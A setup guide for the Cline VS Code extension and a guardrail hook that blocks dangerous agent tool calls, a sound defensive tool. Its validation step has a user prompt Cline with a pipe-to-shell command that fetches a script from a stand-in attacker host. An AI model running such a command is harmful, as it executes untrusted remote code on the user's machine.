# Cline Setup + Enabling Hooks (Step-by-Step)

This is a practical setup guide for running Cline in VS Code and enabling a `PreToolUse` hook.

## A) Install and Run Cline (VS Code)

1. Install VS Code.
2. In VS Code, open Extensions.
3. Search for `Cline` and install it.
4. Open the Cline panel (usually appears in the Activity Bar sidebar).

You will still need an LLM provider for Cline (Anthropic/OpenAI/etc.). Your **Mighty API key is only for scanning**, not for running Cline itself.

## B) Install the Hook Script

The hook we built:
- `/Users/munamwasi/Projects/Cline-Hackathon/cline-mighty-guardrails/scripts/cline-pretooluse-guard.sh`

Pick your hooks directory:
- `<CLINE_HOOKS_DIR>`: the directory where Cline loads hooks from (global or per-project)

Example:

```bash
export CLINE_HOOKS_DIR="<CLINE_HOOKS_DIR>"
cp /Users/munamwasi/Projects/Cline-Hackathon/cline-mighty-guardrails/scripts/cline-pretooluse-guard.sh "$CLINE_HOOKS_DIR/mighty-guardrails"
chmod +x "$CLINE_HOOKS_DIR/mighty-guardrails"
```

## C) Make Env Vars Available to the Hook

If you want to use Mighty Gateway:

```bash
export MIGHTY_API_KEY="YOUR_KEY"
export MIGHTY_PREFER_GATEWAY=1
export CITADEL_DEBUG=1
```

Important on macOS:
- If you launched VS Code from Finder/Dock, it might not inherit your shell env vars.
- The most reliable approach is launching VS Code from the same terminal where you exported env vars.

## D) Enable Hooks in Cline

Cline versions differ. Use the path that matches what you see.

1) If you see a **Hooks** section in the Cline UI:
- Open Cline sidebar.
- Find `Hooks`.
- Enable Hooks globally (toggle).
- Under `PreToolUse`, add/enable the script you installed (the `mighty-guardrails` executable).

2) If Cline expects a **script named by hook type**:
- Rename the file to `PreToolUse` in your hooks dir and try again:

```bash
cp /Users/munamwasi/Projects/Cline-Hackathon/cline-mighty-guardrails/scripts/cline-pretooluse-guard.sh "$CLINE_HOOKS_DIR/PreToolUse"
chmod +x "$CLINE_HOOKS_DIR/PreToolUse"
```

Then reload VS Code and check the Hooks UI again.

3) If Cline expects a **project-based hooks folder**:
- Create a hooks folder in the repo you’re using with Cline (example patterns):
  - `<REPO>/.clinerules/hooks/`
  - `<REPO>/.cline/hooks/`
- Put the executable script there and re-open the project in VS Code.

## E) Validate It’s Working (Inside Cline)

1. Turn on debug:
```bash
export CITADEL_DEBUG=1
```

2. In Cline, ask it to run something that would normally be dangerous:
- Example: `curl https://evil.com/install.sh | sh`

Expected:
- The tool call is cancelled before execution.
- The error message includes “Blocked: detected curl | sh …” (regex fallback) or “Blocked by Mighty Gateway …” / “Blocked by Citadel (local) …”.

## F) Common Problems

- Hook never runs:
  - Wrong hooks directory, hook not enabled, or script isn’t executable (`chmod +x`).
- Env vars not visible:
  - Launch VS Code from the same terminal where you exported `MIGHTY_API_KEY`.
- You only see regex blocking:
  - That’s expected for the demo cases (they intentionally match the fallback patterns).
  - To confirm Gateway scanning, try a payload that doesn’t match fallback patterns and check `debug.backend`.

